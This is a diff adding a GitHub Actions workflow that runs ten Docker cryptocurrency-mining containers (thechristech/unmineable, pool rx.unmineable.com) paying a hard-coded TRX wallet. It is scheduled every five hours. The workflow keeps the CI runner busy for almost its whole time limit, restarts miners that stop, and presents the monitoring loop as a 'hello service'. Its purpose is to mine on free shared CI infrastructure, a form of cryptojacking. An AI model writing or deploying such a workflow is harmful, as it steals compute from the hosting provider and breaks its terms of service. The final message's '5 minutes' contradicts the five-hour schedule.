@@ -1,0 +1,217 @@
+name: Parallel Mining Containers
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */5 * * *'  # Every 5 hours
+
+jobs:
+  parallel-mining:
+    runs-on: ubuntu-latest
+    timeout-minutes: 295  # 4h 55m
+    
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v3
+    
+    - name: System preparation
+      run: |
+        echo "🔧 Preparing system for parallel mining..."
+        echo "=========================================="
+        
+        # Update system
+        sudo apt-get update
+        
+        # Install required tools
+        sudo apt-get install -y jq bc
+        
+        # Get system info
+        echo "📊 System Information:"
+        echo "CPU Cores: $(nproc)"
+        echo "Total Memory: $(free -h | awk '/^Mem:/ {print $2}')"
+        echo "Available Memory: $(free -h | awk '/^Mem:/ {print $7}')"
+        
+        # Clean up existing containers
+        echo "🧹 Cleaning up existing containers..."
+        docker stop $(docker ps -aq --filter "name=miner-") 2>/dev/null || true
+        docker rm $(docker ps -aq --filter "name=miner-") 2>/dev/null || true
+        
+        echo "✅ System ready for parallel mining"
+    
+    - name: Calculate optimal container distribution
+      id: calculate
+      run: |
+        # Get system resources
+        TOTAL_CORES=$(nproc)
+        TOTAL_MEM_MB=$(free -m | awk '/^Mem:/ {print $2}')
+        
+        # Settings for each container
+        CONTAINER_COUNT=10
+        CPU_PERCENT_PER_CONTAINER=6  # 60% total / 10 containers
+        MEMORY_PERCENT_PER_CONTAINER=6  # 60% total / 10 containers
+        
+        # Calculate per-container resources
+        CPU_PER_CONTAINER=$(echo "scale=2; $TOTAL_CORES * $CPU_PERCENT_PER_CONTAINER / 100" | bc)
+        MEMORY_PER_CONTAINER=$(echo "scale=0; $TOTAL_MEM_MB * $MEMORY_PERCENT_PER_CONTAINER / 100" | bc)
+        
+        echo "📈 Resource Allocation:"
+        echo "Total Cores: $TOTAL_CORES"
+        echo "Total Memory: ${TOTAL_MEM_MB}MB"
+        echo "Container Count: $CONTAINER_COUNT"
+        echo "CPU per container: ${CPU_PER_CONTAINER} cores"
+        echo "Memory per container: ${MEMORY_PER_CONTAINER}MB"
+        
+        # Set outputs
+        echo "container_count=$CONTAINER_COUNT" >> $GITHUB_OUTPUT
+        echo "cpu_per_container=$CPU_PER_CONTAINER" >> $GITHUB_OUTPUT
+        echo "memory_per_container=$MEMORY_PER_CONTAINER" >> $GITHUB_OUTPUT
+    
+    - name: Start parallel mining containers
+      run: |
+        echo "🚀 Starting ${{ steps.calculate.outputs.container_count }} parallel mining containers..."
+        echo "======================================================================"
+        
+        CONTAINER_COUNT=${{ steps.calculate.outputs.container_count }}
+        CPU_PER_CONTAINER=${{ steps.calculate.outputs.cpu_per_container }}
+        MEMORY_PER_CONTAINER=${{ steps.calculate.outputs.memory_per_container }}
+        
+        # Base wallet address (you can modify this for different containers)
+        BASE_WALLET="TYnBLKxBNwigxP1wbYEiJTBkNwXpD4o6n9"
+        
+        # Start containers in background
+        for i in $(seq 1 $CONTAINER_COUNT); do
+          CONTAINER_NAME="miner-$i"
+          WORKER_NAME="github-worker-$i"
+          
+          # Create unique wallet suffix for each container if needed
+          WALLET_ADDRESS="$BASE_WALLET"
+          
+          echo "Starting container $i/$CONTAINER_COUNT: $CONTAINER_NAME"
+          
+          docker run \
+            --name $CONTAINER_NAME \
+            --restart unless-stopped \
+            --cpus="$CPU_PER_CONTAINER" \
+            --memory="${MEMORY_PER_CONTAINER}m" \
+            -d \
+            -e POOL="rx.unmineable.com:3333" \
+            -e COIN="TRX" \
+            -e WALLET_ADDRESS="$WALLET_ADDRESS" \
+            -e WORKER_NAME="$WORKER_NAME" \
+            -e CPU_LIMIT_ENABLE="true" \
+            -e CPU_LIMIT_PERCENT="$CPU_PERCENT_PER_CONTAINER" \
+            thechristech/unmineable:latest &
+          
+          # Small delay between container starts
+          sleep 2
+        done
+        
+        # Wait for all containers to start
+        wait
+        
+        echo ""
+        echo "✅ All containers started"
+        echo "📊 Active containers:"
+        docker ps --format "table {{.Names}}\t{{.Status}}\t{{.CPUPerc}}\t{{.MemUsage}}" | head -11
+    
+    - name: Monitor and hello service
+      run: |
+        echo "👀 Starting monitoring service..."
+        echo "================================"
+        
+        # Calculate end time
+        END_TIME=$((SECONDS + 285 * 60))  # 4h 45m
+        HELLO_COUNTER=0
+        
+        # Function to check container health
+        check_containers() {
+          TOTAL_CONTAINERS=${{ steps.calculate.outputs.container_count }}
+          RUNNING_CONTAINERS=$(docker ps --filter "name=miner-" --format "{{.Names}}" | wc -l)
+          
+          if [ "$RUNNING_CONTAINERS" -eq "$TOTAL_CONTAINERS" ]; then
+            echo "✅ All $TOTAL_CONTAINERS containers running"
+          elif [ "$RUNNING_CONTAINERS" -eq 0 ]; then
+            echo "🔴 No containers running!"
+          else
+            echo "⚠️  $RUNNING_CONTAINERS/$TOTAL_CONTAINERS containers running"
+            # List stopped containers
+            STOPPED=$(docker ps -a --filter "name=miner-" --filter "status=exited" --format "{{.Names}}" | tr '\n' ' ')
+            if [ ! -z "$STOPPED" ]; then
+              echo "   Stopped containers: $STOPPED"
+            fi
+          fi
+        }
+        
+        # Main monitoring loop
+        while [ $SECONDS -lt $END_TIME ]; do
+          HELLO_COUNTER=$((HELLO_COUNTER + 1))
+          TIMESTAMP=$(date '+%H:%M:%S')
+          
+          echo ""
+          echo "=== Hello #$HELLO_COUNTER at $TIMESTAMP ==="
+          
+          # Check container status
+          check_containers
+          
+          # Show system resources every 5th hello
+          if [ $((HELLO_COUNTER % 5)) -eq 0 ]; then
+            echo "📊 System Resources:"
+            echo "   Load Average: $(cat /proc/loadavg | awk '{printf "%.2f, %.2f, %.2f", $1, $2, $3}')"
+            echo "   Memory Usage: $(free -m | awk 'NR==2{printf "%.1f%% (%s/%sMB)", $3*100/$2, $3, $2}')"
+            echo "   Disk Usage: $(df -h / | awk 'NR==2{print $5 " used (" $4 " free)"}')"
+          fi
+          
+          # Show container stats every 10th hello
+          if [ $((HELLO_COUNTER % 10)) -eq 0 ]; then
+            echo "📈 Container Statistics:"
+            docker stats --no-stream --format "table {{.Name}}\t{{.CPUPerc}}\t{{.MemPerc}}\t{{.NetIO}}" | head -11
+          fi
+          
+          # Auto-restart any stopped containers
+          STOPPED_CONTAINERS=$(docker ps -a --filter "name=miner-" --filter "status=exited" --format "{{.Names}}")
+          for container in $STOPPED_CONTAINERS; do
+            echo "🔄 Restarting stopped container: $container"
+            docker start $container 2>/dev/null || {
+              echo "⚠️  Failed to restart $container, removing..."
+              docker rm $container 2>/dev/null || true
+            }
+          done
+          
+          # Random sleep between 60-120 seconds
+          SLEEP_TIME=$((RANDOM % 61 + 60))
+          echo "⏳ Next update in $SLEEP_TIME seconds..."
+          sleep $SLEEP_TIME
+        done
+        
+        echo "🕒 Monitoring period ended, preparing for cleanup..."
+    
+    - name: Cleanup and prepare for next run
+      if: always()
+      run: |
+        echo "🧹 Cleaning up parallel containers..."
+        echo "===================================="
+        
+        # Save logs from each container
+        for container in $(docker ps -a --filter "name=miner-" --format "{{.Names}}"); do
+          echo "📄 Saving logs for $container..."
+          docker logs --tail 50 $container 2>/dev/null > "${container}_logs.txt" || true
+        done
+        
+        # Show final stats
+        echo "📊 Final container statistics:"
+        docker stats --no-stream --format "table {{.Name}}\t{{.CPUPerc}}\t{{.MemPerc}}\t{{.NetIO}}" 2>/dev/null | head -11 || true
+        
+        # Stop and remove all containers
+        echo "🛑 Stopping all mining containers..."
+        docker stop $(docker ps -q --filter "name=miner-") 2>/dev/null || true
+        
+        echo "🗑️  Removing containers..."
+        docker rm $(docker ps -aq --filter "name=miner-") 2>/dev/null || true
+        
+        # Clean up Docker system
+        echo "🧽 Cleaning Docker system..."
+        docker system prune -f 2>/dev/null || true
+        
+        echo ""
+        echo "✅ Parallel mining session completed"
+        echo "🔄 Next run scheduled in 5 minutes"
